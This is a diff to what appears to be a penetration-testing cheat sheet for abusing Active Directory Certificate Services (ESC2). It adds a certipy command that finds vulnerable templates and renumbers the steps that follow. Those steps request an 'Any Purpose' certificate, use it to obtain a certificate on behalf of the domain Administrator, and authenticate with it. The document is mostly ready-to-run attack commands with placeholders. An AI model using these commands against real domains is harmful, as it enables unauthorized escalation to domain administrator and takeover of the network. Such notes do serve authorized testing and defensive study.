@@ -2,7 +2,12 @@
 
 % adcs, certificate, ActiveDirectory, template
 
-## 1-a. Get an “Any Purpose” cert (implicitly an agent)
+## 1. Finding vulnerable template
+```
+certipy find -u <username> -p '<password>' -target <CA_FQDN> -vulnerable -stdout
+```
+
+## 2a. Get an “Any Purpose” cert (implicitly an agent)
 ```
 certipy req -u <username> -p '<password>' -target <CA_FQDN> -ca <CA_NAME> \
             -dc-ip <DC_IP> \
@@ -10,7 +15,7 @@ certipy req -u <username> -p '<password>' -target <CA_FQDN> -ca <CA_NAME> \
             -template <ESC2_ANYPURPOSE_TEMPLATE>
 ```
 
-## 1-b. Use it to request a cert **on behalf of** Administrator
+## 2b. Use it to request a cert **on behalf of** Administrator
 ```
 certipy req -u <username> -p '<password>' \
             -dc-ip <DC_IP> -target <CA_FQDN> \
@@ -19,7 +24,7 @@ certipy req -u <username> -p '<password>' \
             -template <ESC2_ANYPURPOSE_TEMPLATE> -on-behalf-of '<domain>\\Administrator'
 ```
 
-## 2. Authenticate
+## 3. Authenticate
 ```
 certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
 ```
